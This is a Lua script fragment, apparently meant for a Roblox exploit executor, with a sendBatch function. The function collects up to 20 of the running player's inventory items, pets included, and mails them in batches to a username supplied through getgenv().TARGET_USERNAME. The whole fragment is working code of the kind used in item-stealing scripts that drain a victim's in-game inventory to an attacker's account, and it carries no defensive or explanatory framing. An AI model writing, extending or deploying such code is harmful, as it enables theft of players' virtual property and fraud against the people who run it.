local Environment = {
	Target = { Name = getgenv().TARGET_USERNAME, Id = nil },
	Mailbox = { PickRecipient = nil, AddToSend = nil, SendBatch = nil },
}

local function sendBatch()
	local currentItems = getValidItems()
	if #currentItems == 0 then return false end

	local batchItems   = {}
	local currentCount = 0

	for _, item in ipairs(currentItems) do
		if currentCount >= 20 then break end
		local amountToAdd = math.min(item.amount, 20 - currentCount)
		for i = 1, amountToAdd do
			table.insert(batchItems, {
				name     = item.uuid or item.name,
				category = item.category,
				isPet    = (item.category == "Pets"),
			})
			currentCount = currentCount + 1
		end
	end

	if #batchItems == 0 then return false end

	Environment.Mailbox.PickRecipient(nil, Environment.Target.Id, Environment.Target.Name)
	task.wait(0.2)

	local itemsAdded = 0
	local liveInv    = getLiveInventory()
	if not liveInv then return false end

	for _, item in ipairs(batchItems) do
		local itemExists = false
		if liveInv[item.category] then
			if item.isPet then
				if liveInv[item.category][item.name] then itemExists = true end
			else
				if liveInv[item.category][item.name] and liveInv[item.category][item.name] > 0 then
					itemExists = true
				end
			end
		end

		if itemExists then
			Environment.Mailbox.AddToSend(nil, item.name, item.category, item.name, {})
			itemsAdded = itemsAdded + 1
			task.wait(0.08)
		end
	end

	if itemsAdded == 0 then return false end
	Environment.Mailbox.SendBatch()
	return true
end

